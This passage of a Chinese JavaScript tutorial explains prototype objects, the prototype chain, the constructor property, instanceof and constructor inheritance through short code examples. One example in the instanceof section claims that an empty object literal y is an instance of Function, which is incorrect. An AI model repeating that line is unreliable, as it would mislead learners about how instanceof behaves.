class="line">cat1.<span class="property">color</span> <span class="comment">// &#x27;white&#x27;</span></span><br><span class="line">cat2.<span class="property">color</span> <span class="comment">// &#x27;white&#x27;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，构造函数<code>Animal</code>的<code>prototype</code>属性，就是实例对象<code>cat1</code>和<code>cat2</code>的原型对象。原型对象上添加一个<code>color</code>属性，结果，实例对象都共享了该属性。</p>
<p>原型对象的属性不是实例对象自身的属性。只要修改原型对象，变动就立刻会体现在<strong>所有</strong>实例对象上。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">color</span> = <span class="string">&#x27;yellow&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// color属性并非实例对象cat1/cat2本身的属性,只是当实例本身没有该属性或方法时，它会到原型对象去寻找该属性或方法</span></span><br><span class="line">cat1.<span class="property">color</span> <span class="comment">// &quot;yellow&quot;  </span></span><br><span class="line">cat2.<span class="property">color</span> <span class="comment">// &quot;yellow&quot;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，原型对象的<code>color</code>属性的值变为<code>yellow</code>，两个实例对象的<code>color</code>属性立刻跟着变了。这是因为实例对象其实没有<code>color</code>属性，都是读取原型对象的<code>color</code>属性。也就是说，<strong>当实例对象本身没有某个属性或方法的时候，它会到原型对象去寻找该属性或方法。</strong>这就是原型对象的特殊之处。</p>
<p>如果<strong>实例对象自身就有某个属性或方法，它就不会再去原型对象寻找这个属性或方法</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat1.<span class="property">color</span> = <span class="string">&#x27;black&#x27;</span>;</span><br><span class="line"></span><br><span class="line">cat1.<span class="property">color</span> <span class="comment">// &#x27;black&#x27;</span></span><br><span class="line">cat2.<span class="property">color</span> <span class="comment">// &#x27;yellow&#x27;</span></span><br><span class="line"><span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">color</span> <span class="comment">// &#x27;yellow&#x27;;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，实例对象<code>cat1</code>的<code>color</code>属性改为<code>black</code>，就使得它不再去原型对象读取<code>color</code>属性，后者的值依然为<code>yellow</code>。</p>
<p>总结一下，原型对象的<strong>作用</strong>，<strong>就是定义所有实例对象共享的属性和方法</strong>。这也是它被称为原型对象的原因，而实例对象可以视作从原型对象衍生出来的子对象。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">walk</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span> + <span class="string">&#x27; is walking&#x27;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>Animal.prototype</code>对象上面定义了一个<code>walk</code>方法，这个方法将可以在所有<code>Animal</code>实例对象上面调用。</p>
<h4 id="（3）原型链"><a href="#（3）原型链" class="headerlink" title="（3）原型链"></a>（3）原型链</h4><p><strong>JavaScript 规定，所有对象都有自己的原型对象（prototype）。一方面，任何一个对象，都可以充当其他对象的原型；另一方面，由于原型对象也是对象，所以它也有自己的原型。因此，就会形成一个“原型链”（prototype chain）：对象到原型，再到原型的原型……</strong></p>
<p>如果一层层地上溯，所有对象的原型<strong>最终都可以上溯到<code>Object.prototype</code>，即<code>Object</code>构造函数的<code>prototype</code>属性</strong>。也就是说，所有对象都继承了<code>Object.prototype</code>的属性。这就是所有对象都有<code>valueOf</code>和<code>toString</code>方法的原因，因为这是从<code>Object.prototype</code>继承的。</p>
<p>那么，<code>Object.prototype</code>对象有没有它的原型呢？回答是<code>Object.prototype</code>的原型是<code>null</code>。<code>null</code>没有任何属性和方法，也没有自己的原型。因此，**原型链的尽头就是<code>null</code>**。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">getPrototypeOf</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>) <span class="comment">// Object.getPrototypeOf方法返回对象的原型</span></span><br><span class="line"><span class="comment">// null</span></span><br></pre></td></tr></table></figure>

<p>上面代码表示，<code>Object.prototype</code>对象的原型是<code>null</code>，由于<code>null</code>没有任何属性，所以原型链到此为止。<code>Object.getPrototypeOf</code>方法返回参数对象的原型，具体介绍请看后文。</p>
<p>**读取对象的某个属性时，JavaScript 引擎先寻找对象本身的属性，如果找不到，就到它的原型去找，如果还是找不到，就到原型的原型去找。如果直到最顶层的<code>Object.prototype</code>还是找不到，则返回<code>undefined</code>**。如果对象自身和它的原型，都定义了一个同名属性，那么优先读取对象自身的属性，这叫做“覆盖”（overriding）。</p>
<p>注意，一级级向上，在整个原型链上寻找某个属性，对性能是有影响的。所寻找的属性在越上层的原型对象，对性能的影响越大。如果寻找某个不存在的属性，将会遍历整个原型链。</p>
<p>举例来说，如果让构造函数的<code>prototype</code>属性指向一个数组，就意味着实例对象可以调用数组方法。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">MyArray</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">MyArray</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Array</span>(); <span class="comment">// 构造函数MyArray的原型指向 数组实例</span></span><br><span class="line"><span class="title class_">MyArray</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> = <span class="title class_">MyArray</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> mine = <span class="keyword">new</span> <span class="title class_">MyArray</span>(); <span class="comment">// mine是构造函数MyArray的实例</span></span><br><span class="line">mine.<span class="title function_">push</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">mine.<span class="property">length</span> <span class="comment">// 3</span></span><br><span class="line">mine <span class="keyword">instanceof</span> <span class="title class_">Array</span> <span class="comment">// true 判断实例对象mine是否为构造函数Array的实例</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>mine</code>是构造函数<code>MyArray</code>的实例对象，由于<code>MyArray.prototype</code>指向一个数组实例，使得<code>mine</code>可以调用数组方法（这些方法定义在数组实例的<code>prototype</code>对象上面）。最后那行<code>instanceof</code>表达式，用来比较一个对象是否为某个构造函数的实例，结果就是证明<code>mine</code>为<code>Array</code>的实例，<code>instanceof</code>运算符的详细解释详见后文。</p>
<p> 上面代码还出现了原型对象的<code>constructor</code>属性，这个属性的含义下一节就来解释。 </p>
<h4 id="（4）constructor-属性"><a href="#（4）constructor-属性" class="headerlink" title="（4）constructor 属性"></a>（4）constructor 属性</h4><p><strong><code>prototype</code>对象有一个<code>constructor</code>属性，默认指向<code>prototype</code>对象所在的构造函数。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">P</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">P.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> === P <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>由于<code>constructor</code>属性定义在<code>prototype</code>对象上面，意味着可以被所有实例对象继承。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">P</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> <span class="title function_">P</span>();</span><br><span class="line"></span><br><span class="line">p.<span class="property">constructor</span> === P <span class="comment">// true  p自身没有constructor属性，它是读取原型上的</span></span><br><span class="line">p.<span class="property">constructor</span> === P.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> <span class="comment">// true</span></span><br><span class="line">p.<span class="title function_">hasOwnProperty</span>(<span class="string">&#x27;constructor&#x27;</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>p</code>是构造函数<code>P</code>的实例对象，但是<code>p</code>自身没有<code>constructor</code>属性，该属性其实是读取原型链上面的<code>P.prototype.constructor</code>属性。</p>
<h5 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h5><p><code>constructor</code>属性的<strong>作用</strong>是，<strong>可以得知某个实例对象，到底是哪一个构造函数产生的</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">F</span>(<span class="params"></span>) &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">new</span> <span class="title function_">F</span>();</span><br><span class="line"></span><br><span class="line">f.<span class="property">constructor</span> === F <span class="comment">// true</span></span><br><span class="line">f.<span class="property">constructor</span> === <span class="title class_">RegExp</span> <span class="comment">// false</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>constructor</code>属性确定了实例对象<code>f</code>的构造函数是<code>F</code>，而不是<code>RegExp</code>。</p>
<p>另一方面，有了<code>constructor</code>属性，就可以从一个实例对象新建另一个实例。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Constr</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line"><span class="keyword">var</span> x = <span class="keyword">new</span> <span class="title class_">Constr</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> y = <span class="keyword">new</span> x.<span class="title function_">constructor</span>(<span class="params"></span>);  <span class="comment">// 等同于 new Constr()</span></span><br><span class="line">y <span class="keyword">instanceof</span> <span class="title class_">Constr</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>x</code>是构造函数<code>Constr</code>的实例，可以从<code>x.constructor</code>间接调用构造函数。这使得在实例方法中，调用自身的构造函数成为可能。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Constr</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">createCopy</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="variable language_">this</span>.<span class="title function_">constructor</span>(<span class="params"></span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>createCopy</code>方法调用构造函数，新建另一个实例。</p>
<p><code>constructor</code>属性<strong>表示原型对象与构造函数之间的关联关系</strong>，如果修改了原型对象，一般会同时修改<code>constructor</code>属性，防止引用的时候出错。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> === <span class="title class_">Person</span> <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span> = &#123; <span class="comment">// 修改了原型对象,但没有修改原型下的constructor</span></span><br><span class="line">  <span class="attr">method</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  由于原型对象已被修改，原型下的constructor也被修改</span></span><br><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> === <span class="title class_">Person</span> <span class="comment">// false </span></span><br><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> === <span class="title class_">Object</span> <span class="comment">// true // 普通对象的constructor指向object构造函数</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，构造函数<code>Person</code>的原型对象改掉了，但是没有修改<code>constructor</code>属性，导致这个属性不再指向<code>Person</code>。由于<code>Person</code>的新原型是一个普通对象，而普通对象的<code>constructor</code>属性指向<code>Object</code>构造函数，导致<code>Person.prototype.constructor</code>变成了<code>Object</code>。</p>
<p>所以，修改原型对象时，一般要同时修改<code>constructor</code>属性的指向。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 坏的写法</span></span><br><span class="line">C.<span class="property"><span class="keyword">prototype</span></span> = &#123;</span><br><span class="line">  <span class="attr">method1</span>: <span class="keyword">function</span> (<span class="params">...</span>) &#123; ... &#125;,</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line">C.<span class="property"><span class="keyword">prototype</span></span> = &#123;</span><br><span class="line">  <span class="attr">constructor</span>: C,</span><br><span class="line">  <span class="attr">method1</span>: <span class="keyword">function</span> (<span class="params">...</span>) &#123; ... &#125;,</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 更好的写法 （只是在原型对象上添加方法）</span></span><br><span class="line">C.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">method1</span> = <span class="keyword">function</span> (<span class="params">...</span>) &#123; ... &#125;;</span><br></pre></td></tr></table></figure>

<p>上面代码中，要么将<code>constructor</code>属性重新指向原来的构造函数，要么只在原型对象上添加方法，这样可以保证<code>instanceof</code>运算符不会失真。</p>
<p>如果不能确定<code>constructor</code>属性是什么函数，还有一个办法：通过<code>name</code>属性，从实例得到构造函数的名称。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">new</span> <span class="title class_">Foo</span>();</span><br><span class="line">f.<span class="property">constructor</span>.<span class="property">name</span> <span class="comment">// &quot;Foo&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="2、instanceof-运算符"><a href="#2、instanceof-运算符" class="headerlink" title="2、instanceof 运算符"></a>2、instanceof 运算符</h3><p> <code>instanceof</code>运算符，<strong>判断对象是否为某个构造函数的实例，返回一个布尔值</strong>。 </p>
<h4 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;实例对象&gt; <span class="keyword">instanceof</span> &lt;构造函数&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var v = new Vehicle();</span><br><span class="line">v instanceof Vehicle // true   v是构造函数Vehicel的实例</span><br></pre></td></tr></table></figure>

<p>上面代码中，对象<code>v</code>是构造函数<code>Vehicle</code>的实例，所以返回<code>true</code>。</p>
<p><code>instanceof</code>运算符的左边是实例对象，右边是构造函数。它会<strong>检查右边构造函数的原型对象（prototype），是否在左边对象的原型链上</strong>。因此，下面两种写法是等价的。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v <span class="keyword">instanceof</span> <span class="title class_">Vehicle</span></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="title class_">Vehicle</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="title function_">isPrototypeOf</span>(v)</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>Object.prototype.isPrototypeOf</code>的详细解释见后文。</p>
<p>由于<code>instanceof</code>检查整个原型链，因此同一个实例对象，可能会对多个构造函数都返回<code>true</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">d <span class="keyword">instanceof</span> <span class="title class_">Date</span> <span class="comment">// true</span></span><br><span class="line">d <span class="keyword">instanceof</span> <span class="title class_">Object</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>d</code>同时是<code>Date</code>和<code>Object</code>的实例，因此对这两个构造函数都返回<code>true</code>。</p>
<p>由于<strong>任意对象（除了<code>null</code>）都是<code>Object</code>的实例</strong>，所以<code>instanceof</code>运算符可以判断一个值是否为非<code>null</code>的对象。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">foo</span>: <span class="number">123</span> &#125;;</span><br><span class="line">obj <span class="keyword">instanceof</span> <span class="title class_">Object</span> <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="literal">null</span> <span class="keyword">instanceof</span> <span class="title class_">Object</span> <span class="comment">// false</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，除了<code>null</code>，其他对象的<code>instanceOf Object</code>的运算结果都是<code>true</code>。</p>
<p><code>instanceof</code>的原理是检查右边构造函数的<code>prototype</code>属性，是否在左边对象的原型链上。有一种<strong>特殊情况</strong>，就是左边对象的原型链上，只有<code>null</code>对象。这时，<code>instanceof</code>判断会失真。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">typeof</span> obj <span class="comment">// &quot;object&quot;</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>) <span class="keyword">instanceof</span> <span class="title class_">Object</span> <span class="comment">// false</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>Object.create(null)</code>返回一个新对象<code>obj</code>，它的原型是<code>null</code>（<code>Object.create</code>的详细介绍见后文）。右边的构造函数<code>Object</code>的<code>prototype</code>属性，不在左边的原型链上，因此<code>instanceof</code>就认为<code>obj</code>不是<code>Object</code>的实例。但是，<strong>只要一个对象的原型不是<code>null</code>，<code>instanceof</code>运算符的判断就不会失真</strong>。</p>
<h4 id="用处"><a href="#用处" class="headerlink" title="用处"></a>用处</h4><p><code>instanceof</code>运算符的一个用处，是<strong>判断值的类型</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> y = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> z = <span class="keyword">function</span> (<span class="params"></span>)&#123;&#125;;</span><br><span class="line">x <span class="keyword">instanceof</span> <span class="title class_">Array</span> <span class="comment">// true</span></span><br><span class="line">y <span class="keyword">instanceof</span> <span class="title class_">Object</span> <span class="comment">// true</span></span><br><span class="line">y <span class="keyword">instanceof</span> <span class="title class_">Function</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>instanceof</code>运算符判断，变量<code>x</code>是数组，变量<code>y</code>是对象，变量<code>z</code>是函数。</p>
<p>注意，<code>instanceof</code>运算符<strong>只能用于对象</strong>，<strong>不适用原始类型的值</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> z = <span class="number">0</span>;</span><br><span class="line">s <span class="keyword">instanceof</span> <span class="title class_">String</span> <span class="comment">// false</span></span><br><span class="line">z <span class="keyword">instanceof</span> <span class="title class_">Number</span> <span class="comment">// false</span></span><br><span class="line"><span class="comment">// 原始类型并没有实例化，所有都返回false</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，字符串不是<code>String</code>对象的实例（因为字符串不是对象），所以返回<code>false</code>。</p>
<p>此外，对于<code>undefined</code>和<code>null</code>，<code>instanceof</code>运算符总是返回<code>false</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">undefined</span> <span class="keyword">instanceof</span> <span class="title class_">Object</span> <span class="comment">// false</span></span><br><span class="line"><span class="literal">null</span> <span class="keyword">instanceof</span> <span class="title class_">Object</span> <span class="comment">// false</span></span><br></pre></td></tr></table></figure>

<p>利用<code>instanceof</code>运算符，还可以巧妙地解决，调用构造函数时，<strong>忘了加<code>new</code>命令的问题</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Fubar</span> (<span class="params">foo, bar</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">this</span> <span class="keyword">instanceof</span> <span class="title class_">Fubar</span>) &#123; <span class="comment">// 忘加new命令时 this为 全局对象window</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">_foo</span> = foo;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">_bar</span> = bar;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Fubar</span>(foo, bar);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Fubar</span>(<span class="number">1</span>, <span class="number">2</span>).<span class="property">_foo</span> <span class="comment">// 1</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">Fubar</span>(<span class="number">1</span>, <span class="number">2</span>)).<span class="property">_foo</span> <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>

<p>上面代码使用<code>instanceof</code>运算符，在函数体内部判断<code>this</code>关键字是否为构造函数<code>Fubar</code>的实例。如果不是，就表明忘了加<code>new</code>命令。</p>
<h3 id="3、构造函数的继承"><a href="#3、构造函数的继承" class="headerlink" title="3、构造函数的继承"></a>3、构造函数的继承</h3><p><strong>让一个构造函数继承另一个构造函数</strong>，是非常常见的需求。</p>
<p>这可以分成两步实现。<strong>第一步是在子类的构造函数中，调用父类的构造函数</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Sub</span>(<span class="params">value</span>) &#123; <span class="comment">// Sub是子类构造函数</span></span><br><span class="line">  <span class="title class_">Super</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>); <span class="comment">// Super是父类构造函数，这的this是子类的实例</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">prop</span> = value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>Sub</code>是子类的构造函数，<code>this</code>是子类的实例。在实例上调用父类的构造函数<code>Super</code>，<strong>就会让子类实例具有父类实例的属性</strong>。</p>
<p><strong>第二步，是让子类的原型指向父类的原型，这样子类就可以继承父类原型。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 子类的原型指向一个新对象，新对象原型指向父类原型，等于子类原型继承了父类原型，且对子类原型操作不会影响到父类原型</span></span><br><span class="line"><span class="title class_">Sub</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="title class_">Super</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line"><span class="title class_">Sub</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> = <span class="title class_">Sub</span>;</span><br><span class="line"><span class="title class_">Sub</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">method</span> = <span class="string">&#x27;...&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>Sub.prototype</code>是子类的原型，要将它赋值为<code>Object.create(Super.prototype)</code>，而不是直接等于<code>Super.prototype</code>。否则后面两行对<code>Sub.prototype</code>的操作，会连父类的原型<code>Super.prototype</code>一起修改掉。</p>
<p> <strong>另外一种写法</strong>是<code>Sub.prototype</code>等于一个父类实例。 </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Sub</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Super</span>();<span class="comment">// 这个写法会继承父类实例的方法，不推荐</span></span><br></pre></td></tr></table></figure>

<p>上面这种写法也有继承的效果，但是子类会具有父类实例的方法。有时，这可能不是我们需要的，所以<strong>不推荐</strong>使用这种写法。</p>
<p>举例来说，下面是一个<code>Shape</code>构造函数。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Shape</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">x</span> = <span class="number">0</span>;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">y</span> = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Shape</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">move</span> = <span class="keyword">function</span> (<span class="params">x, y</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">x</span> += x;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">y</span> += y;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&#x27;Shape moved.&#x27;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>我们需要让<code>Rectangle</code>构造函数继承<code>Shape</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第一步，子类继承父类的实例</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Rectangle</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title class_">Shape</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>); <span class="comment">// 调用父类构造函数</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 另一种写法</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Rectangle</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">base</span> = <span class="title class_">Shape</span>;</span><br><span class="line">  <span class="variable 